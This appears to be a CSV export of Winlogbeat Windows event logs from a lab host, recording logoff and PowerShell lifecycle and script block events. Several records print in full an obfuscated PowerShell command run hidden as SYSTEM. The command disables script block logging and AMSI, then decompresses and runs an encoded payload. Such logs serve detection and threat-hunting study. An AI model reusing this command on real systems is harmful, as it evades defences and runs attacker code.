This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.","-","-","-","-","-","-","-","-","-","-",vagrant,"-","-","-",MANAGER,"S-1-5-21-2306022662-2081110232-4248635931-1001",vagrant,vagrant,"-",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",3,"-","-","-","-","-","-","-","-","-","-","-","-","-","-",MANAGER,"-",0xf8cafa,"-","-","-","-",vagrant,"S-1-5-21-2306022662-2081110232-4248635931-1001","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4634,"Audit Success","-","-","-",0xf8cafa,Network,Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31189,Logoff,"-","-","-","-","-"
"Oct 23, 2022 @ 16:52:46.456",BnkLBIQByII7dpeEYg6R,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 16:52:47.229","Oct 23, 2022 @ 16:52:45.838",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):
$tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))

ScriptBlock ID: a023a65e-1135-42ea-8998-7b9501ce44ac
Path: ","a023a65e-1135-42ea-8998-7b9501ce44ac","$tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-18","-","-","{218ecdf5-e63b-0000-3d40-8f213be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","6,988","7,464","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",5110,"Execute a Remote Command","NT AUTHORITY","S-1-5-18",SYSTEM,User,1
"Oct 23, 2022 @ 16:52:46.207",BXkLBIQByII7dpeEYg6R,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 16:52:46.534","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=5.1.19041.1682
	RunspaceId=69ca20dd-423f-43d6-b9b6-384f6d63f0a4
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=5.1.19041.1682
	RunspaceId=69ca20dd-423f-43d6-b9b6-384f6d63f0a4
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6177,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:46.136",AXkLBIQByII7dpeEYg6R,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:52:46.534","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
